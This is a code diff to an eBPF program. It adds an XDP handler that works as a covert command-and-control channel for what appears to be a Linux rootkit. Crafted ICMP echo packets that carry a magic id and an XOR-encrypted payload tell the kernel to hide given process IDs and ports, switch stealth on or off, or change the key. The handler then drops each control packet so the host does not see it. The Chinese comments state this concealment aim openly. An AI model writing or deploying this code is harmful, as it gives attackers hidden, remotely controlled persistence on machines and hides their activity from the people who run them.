@@ -414,3 +414,175 @@ int sd_nl_out(struct pt_regs *ctx)
     bpf_map_delete_elem(&sd_nl_ctx, &tid);
     return 0;
 }
+
+/* ==================== ICMP C2 控制通道 ====================
+ *
+ * 通过发送特制 ICMP Echo Request 包远程下发隐藏命令
+ * 识别条件：ICMP type=8（Echo），id 字段 == icmp_magic
+ * payload 格式：{ cmd u8, len u8, data[62] }，data 用 icmp_key XOR 加密
+ * 匹配后执行命令并 XDP_DROP 丢弃包，不让目标感知到控制流量
+ */
+
+/* 以太网、IP、ICMP 头结构（精简版，避免引入完整内核头文件）*/
+struct ethhdr_t {
+    __u8  h_dest[6];
+    __u8  h_source[6];
+    __u16 h_proto;
+} __attribute__((packed));
+
+struct iphdr_t {
+    __u8  ihl_ver;   /* version(4) | ihl(4) */
+    __u8  tos;
+    __u16 tot_len;
+    __u16 id;
+    __u16 frag_off;
+    __u8  ttl;
+    __u8  protocol;
+    __u16 check;
+    __u32 saddr;
+    __u32 daddr;
+} __attribute__((packed));
+
+struct icmphdr_t {
+    __u8  type;
+    __u8  code;
+    __u16 checksum;
+    __u16 echo_id;    /* Echo Request/Reply id */
+    __u16 echo_seq;
+} __attribute__((packed));
+
+#define ETH_P_IP    0x0800
+#define IPPROTO_ICMP 1
+#define ICMP_ECHO   8
+
+/*
+ * 处理 ICMP 命令，更新对应 map
+ * 参数 payload 指向 icmp_cmd 结构体，key 为当前 icmp_key
+ */
+static void process_icmp_cmd_xdp(struct icmp_cmd *cmd, __u8 key)
+{
+    __u8 v = 1;
+
+    switch (cmd->cmd) {
+    case ICMP_CMD_HIDE_PID: {
+        if (cmd->len < 4) break;
+        __u32 pid = 0;
+        pid |= (__u32)(cmd->data[0] ^ key);
+        pid |= (__u32)(cmd->data[1] ^ key) << 8;
+        pid |= (__u32)(cmd->data[2] ^ key) << 16;
+        pid |= (__u32)(cmd->data[3] ^ key) << 24;
+        if (pid > 0) {
+            bpf_map_update_elem(&hidden_pids, &pid, &v, BPF_ANY);
+            DBG_PRINT("icmp: hide pid=%u\n", pid);
+        }
+        break;
+    }
+    case ICMP_CMD_HIDE_PORT: {
+        if (cmd->len < 2) break;
+        __u16 port = 0;
+        port |= (__u16)(cmd->data[0] ^ key);
+        port |= (__u16)(cmd->data[1] ^ key) << 8;
+        if (port > 0) {
+            bpf_map_update_elem(&hidden_ports, &port, &v, BPF_ANY);
+            DBG_PRINT("icmp: hide port=%u\n", (__u32)port);
+        }
+        break;
+    }
+    case ICMP_CMD_STEALTH: {
+        __u8 enable = cmd->data[0] ^ key;
+        __u32 k = 0;
+        bpf_map_update_elem(&stealth_state, &k, &enable, BPF_ANY);
+        DBG_PRINT("icmp: stealth=%u\n", (__u32)enable);
+        break;
+    }
+    case ICMP_CMD_CLEAR: {
+        /* 清空各 map：用 bpf_map_delete_elem 循环删除不现实，
+         * 这里通过设置 stealth_state=0 关闭所有过滤 */
+        __u32 k = 0;
+        __u8 off = 0;
+        bpf_map_update_elem(&stealth_state, &k, &off, BPF_ANY);
+        DBG_PRINT("icmp: clear -> stealth off\n");
+        break;
+    }
+    case ICMP_CMD_SET_KEY: {
+        /* data[0..1]=new_magic(u16), data[2]=new_key(u8), 均未加密 */
+        if (cmd->len < 3) break;
+        __u16 new_magic = (__u16)cmd->data[0] | ((__u16)cmd->data[1] << 8);
+        __u8  new_key   = cmd->data[2];
+        __u32 k = 0;
+        bpf_map_update_elem(&icmp_magic, &k, &new_magic, BPF_ANY);
+        bpf_map_update_elem(&icmp_key,   &k, &new_key,   BPF_ANY);
+        DBG_PRINT("icmp: set_key magic=0x%x key=0x%x\n", (__u32)new_magic, (__u32)new_key);
+        break;
+    }
+    default:
+        break;
+    }
+}
+
+SEC("xdp")
+int hk_icmp(struct xdp_md *ctx)
+{
+    void *data     = (void *)(long)ctx->data;
+    void *data_end = (void *)(long)ctx->data_end;
+
+    /* 解析以太网头 */
+    struct ethhdr_t *eth = data;
+    if ((void *)(eth + 1) > data_end)
+        return XDP_PASS;
+    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
+        return XDP_PASS;
+
+    /* 解析 IP 头 */
+    struct iphdr_t *ip = (void *)(eth + 1);
+    if ((void *)(ip + 1) > data_end)
+        return XDP_PASS;
+    if (ip->protocol != IPPROTO_ICMP)
+        return XDP_PASS;
+
+    __u8 ihl = (ip->ihl_ver & 0x0f) * 4;
+    struct icmphdr_t *icmp = (void *)(((__u8 *)ip) + ihl);
+    if ((void *)(icmp + 1) > data_end)
+        return XDP_PASS;
+    if (icmp->type != ICMP_ECHO)
+        return XDP_PASS;
+
+    /* 调试：打印所有 ICMP Echo 包的源 IP、id（主机序）和 id 原始网络序 */
+    DBG_PRINT("icmp: echo from %pI4 id_host=0x%x id_raw=0x%x\n",
+              &ip->saddr, (__u32)bpf_ntohs(icmp->echo_id), (__u32)icmp->echo_id);
+
+    /* 校验魔数：从 icmp_magic map 取，默认 0xC0DE */
+    __u32 mk = 0;
+    __u16 *magic_p = bpf_map_lookup_elem(&icmp_magic, &mk);
+    __u16 magic = (magic_p && *magic_p) ? *magic_p : ICMP_MAGIC;
+    if (icmp->echo_id != bpf_htons(magic))
+        return XDP_PASS;
+
+    /* 取加密密钥 */
+    __u8 *key_p = bpf_map_lookup_elem(&icmp_key, &mk);
+    __u8 key = (key_p && *key_p) ? *key_p : ICMP_KEY_DEFAULT;
+
+    /* 把 icmp_cmd 从包内拷贝到栈上，避免 verifier 对包内指针的越界限制 */
+    void *payload = (void *)(icmp + 1);
+    __u32 payload_len = (__u32)(data_end - payload);
+    /* 打印 payload 前4字节用于调试（需确保在包内）*/
+    if (payload + 4 <= data_end) {
+        __u8 *p = (__u8 *)payload;
+        DBG_PRINT("icmp: payload_len=%u b0=0x%x b1=0x%x b2=0x%x b3=0x%x\n",
+                  payload_len, (__u32)p[0], (__u32)p[1], (__u32)p[2], (__u32)p[3]);
+    } else {
+        DBG_PRINT("icmp: payload_len=%u (too short)\n", payload_len);
+    }
+    if (payload + sizeof(struct icmp_cmd) > data_end)
+        return XDP_DROP;
+
+    struct icmp_cmd cmd_buf = {};
+    bpf_probe_read_kernel(&cmd_buf, sizeof(cmd_buf), payload);
+
+    DBG_PRINT("icmp: C2 hit cmd=0x%x len=%u\n", (__u32)cmd_buf.cmd, (__u32)cmd_buf.len);
+
+    process_icmp_cmd_xdp(&cmd_buf, key);
+
+    /* 丢弃控制包，不让目标感知 */
+    return XDP_DROP;
+}
